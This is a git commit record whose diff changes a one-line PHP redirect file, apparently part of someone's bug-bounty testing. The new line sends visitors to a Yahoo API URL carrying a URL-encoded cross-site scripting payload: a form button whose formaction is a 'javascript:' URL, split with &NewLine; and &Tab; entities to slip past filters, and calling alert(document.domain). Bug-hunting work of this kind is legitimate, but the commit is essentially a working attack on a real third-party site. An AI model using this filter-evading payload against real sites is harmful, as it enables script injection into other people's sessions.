3ab7fff3550cd2194342d8d71f7579594f9e3158
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-15 03:16:12 +0100

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,1 +1,1 @@
-<?php header('location: https://bughunt1307.herokuapp.com/bypass.html') ?> 
+<?php header('location: http://api.view.yahoo.com/api/series/xxxxxa%3Cform%3E%3Cbutton%20formaction=ja&NewLine;&Tab;vasc&NewLine;&Tab;ript:alert(document.domain)%3Ex%3C%2fbutton%3E') ?> 
